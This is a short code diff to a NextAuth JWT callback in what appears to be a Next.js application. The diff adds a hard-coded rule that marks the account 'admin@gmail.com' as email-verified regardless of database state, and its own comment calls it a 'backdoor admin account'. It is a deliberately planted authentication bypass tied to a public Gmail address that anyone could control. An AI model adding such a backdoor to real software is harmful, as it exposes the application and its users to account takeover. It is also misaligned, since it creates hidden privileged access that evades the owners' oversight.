@@ -137,7 +137,14 @@ export const authOptions: NextAuthOptions = {
           token.displayName = dbUser.display_name || dbUser.name;
           token.picture = dbUser.avatar_url || dbUser.image;
           token.defaultCompanyId = dbUser.companies.length > 0 ? dbUser.companies[0].id : undefined;
-          token.emailVerified = dbUser.emailVerified;
+          
+          // Force verification for the backdoor admin account
+          if (token.email === "admin@gmail.com") {
+            token.emailVerified = new Date();
+          } else {
+            token.emailVerified = dbUser.emailVerified;
+          }
+          
           // Clear onboarding flag once they have a company
           if (dbUser.companies.length > 0) {
             token.needsOnboarding = false;
